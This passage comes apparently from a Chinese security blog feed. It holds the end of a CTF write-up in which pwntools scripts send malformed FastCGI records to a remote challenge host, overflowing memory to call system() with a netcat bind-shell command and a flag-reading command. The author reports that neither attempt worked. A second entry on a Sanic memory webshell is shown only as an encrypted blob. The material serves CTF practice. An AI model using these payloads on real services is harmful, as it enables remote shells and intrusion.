class="number">0</span>) + makeBeginReqBody(<span class="number">1</span>, <span class="number">0</span>) + header + (p8(<span class="number">0x13</span>) + p8(<span class="number">0x13</span>) + <span class="string">b&quot;b&quot;</span> * <span class="number">0x26</span>)*<span class="number">9</span> + p8(<span class="number">0</span>) * (<span class="number">2</span> *<span class="number">2</span>)+ p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0xffffffff</span>)  + <span class="string">b&quot;a&quot;</span> * (<span class="number">4</span> * <span class="number">4</span>) + <span class="string">b&quot; /bi;nc -lve /bin/sh&quot;</span> +p32(<span class="number">0</span>) * <span class="number">3</span> + p32(exe.plt[<span class="string">&quot;system&quot;</span>]) )</span><br><span class="line"></span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure><p>显示是执行成功了，但是TM的我shell呢，后来得知貌似是不出网的，也就是说我们需要直接去命令执行攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = context.binary = ELF(<span class="string">&#x27;./challenge&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&quot;35.241.98.126&quot;</span>,<span class="number">30556</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    unsigned char version;</span></span><br><span class="line"><span class="string">    unsigned char type;</span></span><br><span class="line"><span class="string">    unsigned char requestIdB1;</span></span><br><span class="line"><span class="string">    unsigned char requestIdB0;</span></span><br><span class="line"><span class="string">    unsigned char contentLengthB1;</span></span><br><span class="line"><span class="string">    unsigned char contentLengthB0;</span></span><br><span class="line"><span class="string">    unsigned char paddingLength;</span></span><br><span class="line"><span class="string">    unsigned char reserved;</span></span><br><span class="line"><span class="string">&#125; FCGI_Header;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeHeader</span>(<span class="params"><span class="built_in">type</span>, requestId, contentLength, paddingLength</span>):</span><br><span class="line">    header = p8(<span class="number">1</span>) + p8(<span class="built_in">type</span>) + p16(requestId) + p16(contentLength)[::-<span class="number">1</span>] + p8(paddingLength) + p8(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">typedef struct &#123;</span></span><br><span class="line"><span class="string">    unsigned char roleB1;</span></span><br><span class="line"><span class="string">    unsigned char roleB0;</span></span><br><span class="line"><span class="string">    unsigned char flags;</span></span><br><span class="line"><span class="string">    unsigned char reserved[5];</span></span><br><span class="line"><span class="string">&#125; FCGI_BeginRequestBody;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makeBeginReqBody</span>(<span class="params">role, flags</span>):</span><br><span class="line">    <span class="keyword">return</span> p16(role)[::-<span class="number">1</span>] + p8(flags) + <span class="string">b&quot;\x00&quot;</span> * <span class="number">5</span></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line">header = makeHeader(<span class="number">9</span>, <span class="number">0</span>, <span class="number">900</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(exe.plt[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">io.send(makeHeader(<span class="number">1</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">0</span>) + makeBeginReqBody(<span class="number">1</span>, <span class="number">0</span>) + header + (p8(<span class="number">0x13</span>) + p8(<span class="number">0x13</span>) + <span class="string">b&quot;b&quot;</span> * <span class="number">0x26</span>)*<span class="number">9</span> + p8(<span class="number">0</span>) * (<span class="number">2</span> *<span class="number">2</span>)+ p32(<span class="number">0xffffffff</span>) + p32(<span class="number">0xffffffff</span>)  + <span class="string">b&quot;a&quot;</span> * (<span class="number">4</span> * <span class="number">4</span>) + <span class="string">b&quot; /bi;cat .//fl* 1&gt;&amp;3&quot;</span> +p32(<span class="number">0</span>) * <span class="number">3</span> + p32(exe.plt[<span class="string">&quot;system&quot;</span>]) )</span><br><span class="line"></span><br><span class="line">io.interactive ()</span><br></pre></td></tr></table></figure><p>但是依然没有成功，其实仔细看文章可以知道这东西必须访问web服务，才能正确触发</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl http://35.220.136.70:32665/</span><br><span class="line"></span><br><span class="line">python3 1.py</span><br></pre></td></tr></table></figure><p>依旧没有成功</p>]]></content>
    
    
    <summary type="html">m4x哥好强</summary>
    
    
    
    <category term="赛题" scheme="https://baozongwi.xyz/categories/%E8%B5%9B%E9%A2%98/"/>
    
    
  </entry>
  
  <entry>
    <title>sanic内存马</title>
    <link href="https://baozongwi.xyz/posts/43818.html"/>
    <id>https://baozongwi.xyz/posts/43818.html</id>
    <published>2025-05-27T07:35:40.000Z</published>
    <updated>2025-08-08T04:09:21.370Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c2df0284d2270882be99499f47de4a44f94b7feb6c4221951ad5207f85cf4209">a7882eb709ec9e0cc2b453b8d212d825dd037ba06c588a4b7964f9b2a62af968c7018eac58cc55b2f27b5eac98f12a1e7ea46242487934f2e157ce73fc442a642da09489f8e20804b5fb928528155dc36b964c9b3ef8e8907639dc9f8bb8a6d0bb7ac0959bcc5c7cea26b5e7da1c227496a695a9a113d315392d550bef9eeee9ed6bf75768e6b13f0ff856c49e1741d89cfc1bb2a5fcc8ead8b517e9ffa4c2b4f4b2405396522b537e25524537ea06c76b20e347d52be3d276736cdbcf7dd5763a05534662fbd44863a0b3f6a6e4cd39f36fd7aad2d11e75e5d9a3f5b7f78655b5234ff69f2a7a9cd0fab09781785448eb21a6c7d68682e4004b361d18fd263816a71e857c080ea65b189de9c4d2e7a8fca3dc61d93a406402c9f6b9f08038f01cf2082d65bc911eb357f5537ec85444629b60e7290d4db6c9967e29428dace4536779d9f181331535f1969c5ac393aec65406b5ecd32448cba1a2620c2afbed88247e26e1c2c942492511032bd5a46339a47d43c617f4db98ab354329b94bd1f030b8bbca5fdee5a9965281d60a375b9b93bd1f269bbd184133d611de33bde492d8568fb633cfb941c67187d87828b5da9a965ee938f1178e529b068e5f382d968f920d37daae2c0531b7fc9b93cb04f037ace2baa316d0b5852406f5b5aa872ead75b05b986e5b9212b6658be7e97a996800ba203a6ad21469af2e51feb983180b59892704f29d18ee693557ab6fb9b0bffae5c026750138def87f527f4272c2f1890184c14d640f7075190dee2bb6e5a270ef1332fcd1d71b57d062401f11c1a69ee696ed75fa6720b1a31d6f80ce175cc6e2c3a054231b09bb4a5b0c4ea0380e0ae9ee366e278456902e9500a79f1a19ca98ad97d7132457572e9a147ed12d15d1085be05efb13f7126f0f894222fbb543e4fc397806c72bb22f1fd29c497b712c3f3acbf705e3a54e68fd6e3ef729aed8d9ae55b362aaf9d707300a44e9804d5c544f694b72f839de162cbad9216cc8e20baf705dbac2ac8b6ab61c57cebeb99c6502e97b8ddf29f5805973b1289a9277cca623b0b20f4c8325908984048851c2461113d1b7a7306591326bce71d3d4418c7f3a99697652bd70891801415463651b7b313b579fcea0ea85b3cfcf215729c5b98d2d2b04250e17d4a02b7c0801f6b334990532e9d28ca98097f24d5aa85a3fa612776235501ba9370131d199e5035bca50a512acd406691dcf4bf382a075b2e127bec4814feda9038deb86d59acf70fd999f083b969a5dfe379b88f993d42cefec61ec2d8ed320bde90e6f65101bed00d3daaaabbafeb3c507760b947c101f7c9cfb43a1c0b3beee2169b9dfc1e1b5e75d06397930b62c3138b325955afcfcfc1453451643a5d8b284e02c75c095d93f66c80bdcc1f4a6e0e3292dca943a1e22126f53e500bfa7d13bea76054d6d8bf62401a931e63bb59d7b0187e66e9c268ff9396e96f563082abd3c43ccf899bbef108a0d07697380780006d445f7dde02ef5433bbf229e5916a2e94eac1ba20dad379479bb9da6693f108dcbd805e00f236bf4cfc270df69446e446f6afbbf276162fb112b51f4d21193d14d38d1106e5ed4b75058972983dde1a3b0a9b19e50078895fbf6ff6f774fd48593c232e185a2c4cd20c6c8eef8b894d130a6d277532800426954eabf186749911d8a1429fe3a664e61ce8675808dfb595b58b13524ec701b006445a20fd315633932d77abf20a407fb422d9d3b0a6dc77e097dfee494c80d1607caa7adb50048c26237666afd5a322806f599fe65cf67aac6f9a79f5994bc258ddedf9e4a44dc776a8e52cf987873e7061db3e0deb1a622824c68b7c5af86be714bcb338bc77ba4f0bda6236c7b6a99f1c4ace7cd930e61c3b554b557709a07b7a5bdb539dd17d4d1d15f431853f6f268275814c0b44d6a9d441c82f3711ecd44536b489d1e32608af7d71caae74975f14a11b8c2489b2aef4fa5f0b4896442f68f5da70d3a137d23cd5a792a6ad7afcc0667d43aa0ddc4189bbff2c88765138b12d49a20f354d99cb003df082d7f6fcc173e09875290f0d05ae5e09fafd6c4e429a30d1026f83e07222bf17aecdb1a7d13d1511e4016e0becb7ba99a651c3586aa9bfdb06eeee655047d5fac24b73eb2da08b6b2e891901410149c67f9803d6a8ab50f75271d0b34e71ee8144a3b4b2009dbf61a8ddd8e621cf00423f5f675bd34dd1f3599f1e4946c3bcf2bfa773f582cc7292c181ae209f900463bdea2bb6350b89f25f5d12995148e900f3331bd846c3eafa9b64606a6a232504aaabc0bb560cc487567d7b34427153ad1e823c07c60948daad8f00c61c0520a4320c7a2da17ec500f84aa49316f9bdbe71185890427bdabc41fc45464f1062401ad252fd4c936762b44823529e2bc9cb417ba9ebfd28758b010bb83b2685b440e44147549c9ff29236bd598da57e978b188298900adf16ffb7379bce7242664f2497ecff402f6148b625f617ca7facfb337c9ceb3ace096ebfccff8e84b1bfd18aabd35c061c1903bd0430bf21147f620dc5a963ea9a168f958a23ddeaa44ae4a64131a7e2e368f43cc3dfa1c7975ae14cbe7237ee8c8d546ab3817f2dc2f9ac2504dc29363a17fff7096ca45ba4985f8f16bb5e5509aaa5581cf5764d6fd95769eb509023249d88d4a9ba0a62697df745c79767fe055f8fb8f72b4e5b42b1d9e5b1882eb196107316569d2ce0237e6b346a767708147f05a884f0be6f9efc6c21a160958e9f3f1829798ab981fc7de697cd1859e4efd1107b08bfbb4e048c8f63a43a6e9ff1aaff7a68639f322e3c3308b7cabf17390c8810a989544c11d9339e5c89dbfec46687b3efd13e391b898cc9ba76238a5d774a0728cba3d7c560f5ed6ee6c6ae78c5a8a160b8fa3c17180a791398d37be2cfd79e8665136136c99018b89bb00d2caf7c15e68e6f9004170f36def5101b8adb3f4578fc67392a72d21f1d22e4edc9a093df48b6ac435f8bd89a61bc5957da377198ca26dec521f98f227924a9b33f55c01114efa2712c03d5a67fe5ffca10de701c46d13a2e619e4d9f21fe0f44fecdae26b73289450faf0ffdf3b93c674162c3c3b044ae73670ee3f050035453ba12bd42b6ce320b32c1d107ff9074f3d07e8b53d44ff14d7e9fa5ed6394be6b368aa1fcfd0e1c9542979c97751e55baade24efb2714b864fff3b5395b0808be30f2038df9504a81c601dc3157046f0c0bf9d01e3bca2aa82de94f97d66013e5a6ee422b15afe0c1102c31cdf98784e2eef497516825402ccb43acf1b50bbe7c80a494b4d4c704f824af0e10a06c81089f3df550d4d67da7a7d78c7ef665529a556d6cbd5c0929557a053f27a0ccf5333f0c85a2398528a90f99b6581bd1c10793a0ea2db86ea79a1e5d1328443147a642daa4d3e49018b51ed2d67566400153e43c48e78da17f74534b1c2507a1c73c2e4e27da934f6db0b54ddc1197339ab7aabac5fe10e8121a8d26a5194681b677a65e273ec73c8004959154cfffc97321f6a2dfd4eaab8375a3bb0aed9e53c3fe59af1099f49e0adb6f5bd82edcf4c0181fd41a064601b637cda8a1bffe0ce327a701b550ccb2d377884dcc26f997c000274deee0aff83e93dc660b78042408b71d0ce7878225e35e7c3860bebf0c8e60870f2f518645f186818beca497be31b2d5a6909ad77d184e85c085f1698bd2c22cc90077cb0485b8da6907af4fbeacd7881f30cb4b2f434ca81166708266088603bb0d6d0d0809c56cb8c4651ae6c323f06a2ef50d47e43c239e305776b197c19f3e763257dc1e35c1bdd4f6271af73e8ae44099c476759ab08dde0aeba27d5400ccf3f622f949910c9c0255a4781f2459932529200ca7ded587c3624ae9944b4e3185d5a0c895938830d763cd20623aaa233e27fb62d4a7f7c55e7e1532b8e9e8bab7b66e63c0bdd50ee50919d444f06c86ff85107f63bdee3b4e6688599d367741685cbb91bd1b9f5eb410abf6e6b6661885d1f6d24e62e6786017fb095d18c786c686a0c3dbefe4df56e57686654224e3a968f7f368c38616fc43007ce239d5357011d931432ff7a657dc7365077d17c6a274c19fe07e012f6c87c5f299e5917abb46e313cb54e0dfed57341c3626afa97b709e58fe920ddbb5439e46f0287410d719ead7c7f895abb01e8efa9df0207437b412015aa12178ceba0093f728c0b0ed929adba5d4584296fa7d777f21a0078ca267ed8a342363dc262a07773c29e0fda72b9182f29afdedd005e9249702bc38aaec7c6d74dd6b49917a6a3c030d5784017f3abfa28ec75c8bc4b8880c627f789e9affd3e1050b2ea9ca521147a87f83f4d01180322cebc6ce0bca46e6921b0e6e0a13baa487c6b3ae0f5bdbd8b9967c43c698411b110cda2b121008a31b9db06d90f7f3d2bea58671e8b48348983dd1ce23263722bc939e72f8dd1d188603e4586f36166e3b4bbd8f300047fa62405963cb779eab7144e189317bde9d4a95fbef5de461d1fe8ffde9afa6690b530b383bccf1da8fa6992b53772c24253d24e3edf7df23f27987f11674991b5cc48073de6c97ccc33284899aa3d0db95d33c7dded5d5be83cbcd1cddef520791a7f94cc9ed7334d2a41863e415399862238e13380e8aae3a015035ea1c73fdcb61b944dc5fc495937dec7212ee988db710edd918628f009abb805d51d063eadc947aa36460a2c34f7d4c985a5fdd0303a82471aef7b888144fc84c2f54cbb6f217a91bb5063bafa57ba6bad6c787c3e94448e584dfd7bf829ce978e836bbea905aec08406989d59fd2c92e024d45669b0ea715ec5660e41307c695cb0a99e57451e04c0c74441dbce12a76001a0ababed1d7b6b69f7e9fd626c7b7759e784882e9390fc88bd8fa39b0b0a4ee8e7e16c413bd94b74b63eb19ad89bf33ddabac4aab4fa1cef19fb8541fd5635969738c93dc0e938a09a4011070db76076486f26a54a505d5982dd310073b1011c3a3e4fffc23337898f4f69a16b8e42cfbd5fb28778ea56184f377627e27fec6362010bc520205c616997bbc20de07ca5517332bce1aa092c3bcda8d4b9e83e8cb5a76103b155070feae0ca2533448fa95e90df318cd9c77d8fb7acaec9db46c16aa758cb844b40bf38c1cf1e20b487f3c4a4d4bb1569faa2363b6028a16ed9f9072442d13319dd16e4c8a07186703294c0b849959b8f0ced812a1a73ea95b88a7442e0e7dd5df5de1e9c815c03f317a819148974b3056840a43bb35ab2e1037694b4b0a40ce783e75e7f1b968e08d9231f8c20f2d240a698fc731974f7bdc5996ba39f00e4010dbc7934e93a81538a60059e7f0e411e27eea77cce509089fa404fe42d2c5c4b86fe2f448aa926ca37f3488128f0c6c81407f09eac3df1a587d148308529592f4f8d0de56349bdf0f5904a49382b15f2a4f2391f727a90979055c236e45147a2007d5d182746edf85e33ea41e009a7cee91e42a2a24c1c76a5359d4745c5b301345fe80ca434ebd85b6538f1827052b4674fd33315060bedbdbd75fb0630712fcc5e1b350472076f5228f35568afcf0e9e0e3039511df6c227d8d827c6adb4e79a421b89c493e9aedfb2663a402f454ee82aa0535eb3c94aa018fff4c081f0594a55c565d99e2f9c506ebf96f2a90f8a50ea9cf164b5fdf53fc1c560fc35c6e8a83542aa195b2e16a6b61e637ba07a835370387205539e862c1b14b0ffb43cf2f5a1ee0feebcbcf13ae8c09bc2e48f9a2d8da706d81badd09d2bc108054a94f582980bace1b0c4fedfe52f617dd88092002675c2e0a0e491fb7e5c9edf83e72d8520baa93765dbd71a1da960880af076d3038aa1ed4676b79e16abbd9004a328033470a158f675dd8b82a0bb333e370d0728947eafaa34dd9cfe248b99cdf3828966d93c7f14bed6f9667bb6d35f35b36dd8cb7a09585fbf007e05a0dfea48b4dda1a3cb982700f1c16ff44da0850ae84d8935335a8b6ffe2c79a523f7bfed4c11041cbf7b6acc75387e9369b1d5d2cc558a15ff1457e899cbebdbb2b4c7f0bccdc07cb2087e4e2dab617940d6e0b9c96a3c7bc8eafa5af50874be9d0bc8e2a676490854824c46d8f5c9d9dfca878bd87dcf2908943587532b920878e3f263c6230d261005feea4516486bd03dfb13d0b98f420a4a09bcea0f59a142a1d9302b3b500e5c044c72095336c2706dab3db5e551b68f96898ecb49d64947291fcfd672bfd2a587d593abc8740135f942b85cfde062515e3aebffc5ce5744507ab1f9029c5bd5979412cb4db8d26177f8bb3427b0041a4575bdc458025d3854af0f608251e24b1f9c503d98a09e65076dc9eaac71c9e58cc2aaf2d072c1829db6f0da795762b25db5973dff741fd48bd07f07c15137f27a059f050a84d5c83461fe90e692ff04cf630390b17788e15b24b451b258fc2e912f3777e3b76d723c97b042b0e6548a919ed18baddd2d6a7248124c6b64de0979485f9d9b1eaebc9914f66476cb9521c28901f85f4bda1dae79120888fc3a78c171486f9f56259a8696fa0f61d7a4ad764975aef31adbe11621f17061af628024348e8657296797d7fb6cb80b58aee61865b028c59fa27d37efe5c6a722bc8352c9b1d155551cbedc723069bc9182d17ecea5062c21f17b2e57ed581efa78fb1a7751f801dc337d8271e1cb54c51774798590a849a4677e3f0a2944f417782315551c104791ac8e4913118437cb1415e5e7e4cb0e8fce8d2502b0198dedc003db8e517246749f18c983bfe3b747f9b00729d0fcc0c11bb2f9a142856334ba6cc4730cb93405e0666e67a66132389b87b7e5ed55086dbd7b5c45127c226c9e0e4f4188823e548bb29367bf4cfea95919b3cae4c2721fafc4a6320cf4f1b2c201cc1584db187380485144630622b35d5543fbc7c9a0a75b72c3546efe453a8b0c5532d644d765a55c56ce6de7121ef06c4b7ee1914a20ad215f289bb2d83740424829aa019f8fc4f43e18930c3b8c04373077c66302a913c46887c29389de89081c3f25c2364c7e5712ae6e28871977d327a668034adbed0038faee1e2e0df49f28e1ec0150384027e248a4964986f5841626b9d21160d9a008c3d71f84e0702db3991d383e7285f5781c777cd26fecc358797934f11fbdb396f7a62e85d235cb48d0a81017aa513ead48a26965ba616401750d3c3674e0a8aa107e3b262848429dbfc71cf5f3d1b240a9673a5d6df764ce2cb6ff69ebdb51d7b040c2010a2c74ab2f751afaa50f8bfdaad8fd1d8b4830a2cc8c92b73d0b034ecf1e61de941054e2526742386bbb1f490f475f36fa32e7c7c6411e7ae4238133d3160a76e753ac66fbe264455dfc6ecb208a0cfa72ed7afa12127df3921095ad78307a49aaac5d6bc92dce9af7a7c183c38f5d77ad1818e5b097e654879d3524f22884dde1861323329e14c16ba439169195d59a44e0282c686e699a779c42a3deb4a6595299a3ae9491401008884da0dd3cac423b2a675f2be1c16d5fab3933339b760d99ba96a8cf9cf25c5217a98ab82fc0cd97bf067209737bde1fe689283ea9b8e7fdb9e67bea219bb3ab9b4cdaef04ade3fb2455bfabe4602daef80b4ea457438b6448990b8a3726a87f83a8287562c0dbf3f3630d9f8e9e25e65f5c7ce1746e546e0f0afd95531ccf9dd6ff772eca2370ec67f5f75576ba6ba17aa2801c65743f8d2be0f8de400205e9dfe19cd835d33534969d65eca1c2bd03ec7b9df2e67ae1d72c6fc41835789436471b34dd952bdcbf241c274ef029d948bfb02767d248a18e0d97a2d30dda4b5a8f896d67a0dc8aa9488f3c83d557f86d47c6468d71a48a5605457df1f0259cc4011484834b17cee1d9c867480f1dcc842da2dc9b74c69e116a84ef33acc4a1d2b1fb1284ff9d8384f133d508610082a1c00f4b8b33e3a242d00e2c7ed4efe645abb7fc8aaca0885c073c8bc9482d3500e589258a43b4d36560948ac54a3c7f8eb73a8e106d9c7a22da27eafe4f2f8291cbee6b45efac0026c3dbcd26f1d251ae5c45e225540f0f6ae883b909bb9ff08af3537dc0239533793b9609e125559e75601c969e42320fefed8e5ff55474a7a0bb1669134a41dcc36c22009ab7a2acdf726ddfc0a3ffa9ef26e87386123ae9298deb816aad3d7f5eebbab9c4cf801d17859a7dc7ab20dcf9588212ba97b3595058dd7e85f695ebee9f2f0339c0ce07eb3b87b005da88843e2e494fedf33103717f6b7818118fc0c6a48bfe89482e19931395ead04a1b1335fd1d1317b93a96941bbbf00723ec5a0d660d78e70f2638e0a7f4f741b3996c0f56b745c25db89c81125ae4f2449baa4dc72987bd863adb14cbe884d3a263652931bff3b10beccde04a68276f35da942a8c5909349b710f1d2dd33be3662f3883f21ff5b898049b86e01dbf20d3b5460212ee6f54d14b51216ebd0da459784ca68dbfe635f1c0b5b04c16725cf85e0ecccb5bc8c9b6a5c3a5bbc2b171293e67056eb39c54f0d392ce45dfef924f06c711df8efc6ecac48e77760625e6828ce13b204e5eeb8e7c6782df7244694972a59e32dd719e30f9dc0c8453e4facb55b6f426109f801889a73b79b3b6f4ea259518ecdcfe3e5e1444bd6b4a73caeb177fc2fdc9983a79d24204c0ac8412fec4aa01778aaa30488d1d79191583602874c5c814ad339c48fd9c14d4edd8b4e647bc60e474cc4061e95db9e7ba7096abe75743a5a12b61a52ebf9ee0e3b19e1cb1374e332a10ac88cf42fe3cf3daff122c855e74aaefbcb9640cc80fc44b704eff7bd1a85e230e1697d8135e116413879e17ded682b146c677d9f8c6987b9ff4a4db8ba00d49014519f8b8c2361f289cdf59c59246eab671f890fcc539566bfd1aac6837b5e9f99d5c4b36f28945a8561292bed887c508f5cece6fe542ae228455e6f465eec51b0bdbaba1a2a478eb8c09f78b1d92d571d8940a2611df79cbdfff0267e9ac04e5d58c76975dec8e5f3d61060ad03c42dbbf8c4ac6edcecc330eaaf658e396e917190cef7cdf9cc16a12eb910719aa9a4b1788c54e13a1eceb43236fa4f9defe889b164f906260957fd023f43efece6a740dc7132a38086234222bb0fb38b92aa7c4dbec301a922e617d6f9a363a71a6e66f5ddb44ac6de9aa2a38daa17604affeef4804c126c85ba5c2f448cd1efbc30d18322b6feabc79ec6fa25bd30a595a10fef85c456413e6cf6b90256c1178ca14b22160fa213d95e7979d9585670c1d4ff01c96e1b4b931dcafc0fd15bff4a3edf3e6323920da058f714f470fad595ee9bbca1cdf16598dac7152a01af9b03514e835aad5512623c777038a55935af99afc963227e6d974712bd20858c54f53b15faef8927e42e5b2848bab90c96cdc950b39f8b3a7a07046c53084710039d785ce9032faabef3441ed680193c691efcf111af0cd04b97d36eef914d11fa6285ebc050d0c11ae7c57c118507cf24afac59a454b0750922459e9ec66571145843c68e0185fd6d43a5ae6af016f9860f21cdf0cbca7198b5d500217ee77cb747a565a8f5bcc10b3cb0a391536e92d800b8b681d75d50a6e0c9c9fd6d2ea5edb0e2a71354535e2d564109762b85b73ccfe0eeeadca05419ce4d726c425af056aa00062aa2d8a1bbf4a9890fced3a0845191e66cf0904bc84cad59cf1d6c6c1d9f20ea449c184d635509fd84c9347efcb0efb31a6fa9708c7e72cce4a6cc35c027381eeaab286db6e8498d6fe562f0031db34a3d552909c74b0c1d738046c7523d9206df5546f89a272dc61a9c39e9e2431612a41323063ee99189ffba8704639852724296190f9a4dbce84c8f0596ded27f10c07bf6d5b41ce485ab05d86731ebf8a2ae73bb89c4a1a5221b76b05a1a5e88ecb7a1d13308b00c90bc2fd90f30b8c9f104bea4111a21addace76df2991f7efbc85954dc391d9454a149ef026262e1f3cdbc03af66efdc73b6baf0cfd9052f5bf7f79d04e43ab00a0f72a9c9303917fb091996a960cfbe0d19f9c5ff73865fa4fa190aac7191cad8befd9d2b32c1c74b22164967db16319e502eb52e79b2035d8147587143e40f71e84a4c850bdd0be13b12f6596b8dd676ff4c6848e20cf39c89556c18e6dcdeb79f281a25bb62097399a3d8ad1497438a15e47e3f653531da7169a43300b6dc205815e2a0e16d8fb9777c4c9816dce76d9737a882a0c1c64b89e0867a646b7cff2f558b925c86d682aa10032e945b6b867e27d5d4fc5e11557726fa702928b55819ef8160a934feda3a98102ab821f61be2b66232810483c4735900dc4010d27b481ea03f20dc64863903681d5b5288d07814f24876aeb044ba114620b713497cb9dc03f37ad0b602871be8bd6ed3b1fa07bf5712fe890aa46cab3eb33538d14f2461824d619ab5a8cfd52dd6100dcc274072967dc0233a59c4f4feeabca314595b32b960176061ed1a66db250c2e50a6261daa381920cf1bfda16b48490afd6583cf1bf2d3048ef4e1210acba49d312c75abb03c340a79e5dec066d6fceb4e3d3b6b720229a6bd19407a0e0a8ca1514a2f4dbdd0bd25c382386d74bb833ee00fd62c30ea5a88bb2f0242d3330faa988849748276c806f16f053fd8ae2d555cbd93cb479bd60ef528e2ea62fe02784c02aedb6609bd12f881ac8f847c58d356f7a28a2d6ecc33317b6765eb9e01390d2e3508bee876f689b55c5df384312982165fbe9527e9a435b4bbb4059f619aee404041576cc7f907ec078066dfb627e7141409117a1cad9a1e3ddd382a3fa77826936bb4f77ba9bbbe971d41a24d12649d8f4315e0c384bf9b67f7ce1f8eccc64ac13fc2cbddb5d69a1c024834b6d90f80e8a19670b865ebd636832f067e05b72cdf002be9277b431ee9170b96f4d9fb5c0a9063105550c2ff700139d0a57a7ebbfdd979d602fddf5005dcf4dd35393a21f3ee219fdfef5ac21092867c68cf290f65054b5d2319157719c77a579fb02ce7fa9f97a3e6584dce0f7be23d49c1e8fb97f76118a2c8f5a2ad631ccc1a28f30778fcd45c99c583bbee0336522f1b56dc136e8d2e7929a95ab9a2c2befe3ce68694160edf7856d84386345886f04ee02f1927babe152891d9396464ade599641b9754fee954a8ae389a86d65c8034b7a353e95c178542b4c34c9bbecfda16a73a64717d1fd2e1b4764af4331d2c0897c944243c7808ba7f45b2cd8893d6c81a536319f9a604526319eedf732877212870022498384d6ed8a24486e53d8fddf4a5bb01d23afcc3bd9a1f3894469df4fd8cb0e56c9f376f4bb6e3adf02cd78918faacc218d48851831da18d91b619a6f6043240ceb902a32428e88b796ea56b43ce952da1aa6a9edd0497e60747076e6bd919c1390bce29e58f19094e41507a92e48a6471dc7a1c9d5a0ee87760447e90f57df5699f900567c42363539c7ae6970d73404a533b7661354fa228e8d1b3788e0524ce3903850a6c967c77f75ddbc877799b1c6a4fc2d4d413a2580be52ea98fd174ef4de69f53e26fb97cb288da435c9f70f7d2468449c4d3a426cda74ee801c783ee69d2739d1eb369595ba5d7902428cee91f64f12c0d3d4e3f295942523c8a89c755d1131857cc8c3a7ccd90507af88a8baa7d6f0431a5afd0ec54b7fd9d2297b089744b65028e220d756c48bbb614c6ac2febd1faf85ff88519436003b997d291c1889e3ad1c20b47cc23305f8d6559ed08264ec3048472fd3e6da5e53430e0ffd08db973e1edbe67268528f83d32e6a651c2aca0d0c5548ac37cd5faf3a7cafc2cf838bee4225d30ccd2abcd0653f36b0a046430f3774b308e6b29fffb3cf054602dcc4a3aa7a067ce4ee5ff7ea83004a803ea0e5dec925dca34aafba4e3baba033c3c7713946b75066d671048a678f8bdb85a693e728f89c64596e8c3ba1f5dac287f26c6318a3571329f2bb1c7f979e20105818d25e288adc5634d9c07f5b0673112c086282bab7240c4b191994b63d38cab706bb6c6ce99d54c8c37910489ccaacd4f8b5c753e2a4fe0b8e4db4dc877945f1ac8fd11436248da9fba4b5f4eca145376bf113b6421e6e803780dad2c3e5cf45bdf78fec200aa28c80778861c04472c44c9ad34494be7248c4ff5c24d4f85b97e04b3592f7a64c2587891497a20dde862b55f172bf7434eb35ee10b8e3929264a5ef6c4a688f74c6e5f3ee403094d4d8ddd5f32d5b4ad666d23a5efce6c61d4b088196f98aadbe503c6b623fcc7231f6f0a6c0411ee00815fb80b8e232c359b1a06c126d13e0b222a8fdd33b248d78ecf2265687c0bb5300bd62ff81e6690d953ecbf3bb75704f7ae7c0ec18f7be40de026411c3bb2ed408f675de56180f636d09751ecb04abb149f18ee67751ba36e5ffefd025ed54a26111137c445f5fba0bda8b7c1b1c7a66f60c6bf5390dd7935cc9d0e73cdb1fafd4fa7ab35e648ec15cbcf45f9ef98e8f2a3541069c36708e6e102b94d8d4b04ee813dd9f73052918db959998f2cd3639fed40fbce98c4784a2150acbd0ee10d199d51b9054a53c83ac443bee9c774d3e7ee4799158b2754c84fcc41018341a97ab73dad6da161ad8851815dc701813637ae4bd93f5869034295536ffc7eb6495a7891892d149a0240b3b04e2963f1